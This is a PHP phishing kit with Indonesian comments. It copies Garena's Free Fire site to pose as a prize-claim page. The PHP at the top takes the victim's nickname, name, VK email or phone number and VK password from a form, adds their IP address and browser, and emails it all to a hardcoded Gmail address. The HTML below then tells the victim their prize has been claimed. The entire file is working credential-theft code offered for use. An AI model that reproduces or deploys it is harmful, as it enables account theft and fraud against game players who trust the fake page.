<?php
#############################################
##       Author :       DIANSPEDIA          ##
##       Mailer :       DIANSPEDIA          ##
##       Modifer :      DIANSPEDIA          ##
#############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG, NANTI ERROR */

$nickname= $_POST['nickname'];
$nama= $_POST['nama'];
$emailvk= $_POST['emailvk'];
$passvk= $_POST['passvk'];

$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$link = $_SERVER['SERVER_NAME'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$emailkamu = 
"larabwhite2@gmail.com"; //GANTI EMAILMU DIMARI GAN UNTUK RESULT FACEBOOK NYA
$tomail = $emailkamu; 

$subject = "Setor FF Via VK Nickname [$nickname] Alamat IP [$ip]";
$message = '
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b>UHUINFO99</b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:black;color:white;text-align:center;">
<hr style="color:red">
Nama Orang : <b>'.$nama.' | Nickname : <b>'.$nickname.' </b>
<hr style="color:red">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:white;padding:0px;background:red">
				EMAIL/No HP VK
			</th>
			<th style="color:white;padding:3px;background:red">
				PASS VK
			</th>	
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$emailvk.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$passvk.'</b>				
			</td>
		</tr>
	</tbody>
</div>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=3 color=white><b> 2018 - UHUINFO99</b></font></div>
</center>
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: SETOR FreeFire  <uhuinfo@kasep>' . "\r\n";
$datamail = mail($tomail,$subject, $message, $headersx);
?>

<!DOCTYPE html>
<html lang="zh">


<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
	<meta name="title" content="FreeFire">
    <meta name="description" content="FreeFire">
    <meta property="og:title" content="FreeFire">
    <meta property="og:description" content="FreeFire">
	</script>
	<link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/common/reset.css">
	<link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/common.css">  
    <link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/swiper.css">
    <link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/firepass/season02.css">
    <!-- M002 V3 -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- set if need to be able scaled -->
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="title" content="FreeFire">
    <meta name="description" content="FreeFire">
    <meta property="og:title" content="FreeFire">
    <meta property="og:description" content="FreeFire">
    <title>Free Fire</title>
    <link rel="shortcut icon" href="https://ff.garena.tw/static/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="css/reset.css" />
    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <link href="css/all.css" rel="stylesheet">
    <link href="css/extra.css" rel="stylesheet">
    <!-- the css editable in USE -->
</head>
<div data-reactroot="">
<div class="container">
<div class="a_wrap2">
<div class="col-md-5 col-sm-5 col-xs-5">
<img src="imgg/logoff.png" class="gamelogo">
</div><div class="col-md-5 col-sm-5 col-xs-5">
<img src="imgg/garena.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Claim Success!</span></div><div class="a_wrap"><div></div>
<br><div><div></a></span></div>

<br>
<br><div><div></a></span></div>
<p><h5>Succes Claim!</h5></p>
</div><div class="more"><ol>
<li><!-- react-text: 18 -->1. Congratulations The Prize Has Been Claimed </li>
<li><!-- react-text: 22 -->2. Please Wait For Your Prize Within A Few Days </li>
<br>
<li>Remember: You Cannot Claim Prizes If You Use A Guest Account. Please Bind Your Account To Facebook or VK To Receive Prizes</li>
<br>
<center><a href="index.php" class="button"><img src="imgg/logout.png" </center>
</div></div></div></div>

<br>

<br>

<br>
<body>
<div class="g-footer clearFix">
    <div class="m-foot-wrap">
 <div class="m-foot-copyright">
            <div class="m-foot-logo"><img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/logo_small_foot.png"></div>
            <div class="txt">Copyright © Garena International.<br>Trademarks belong to their respective owners. All rights Reserved.</div>
    <div id="app"></div>

<script type="text/javascript" src="bundle.js"></script></body>
</html>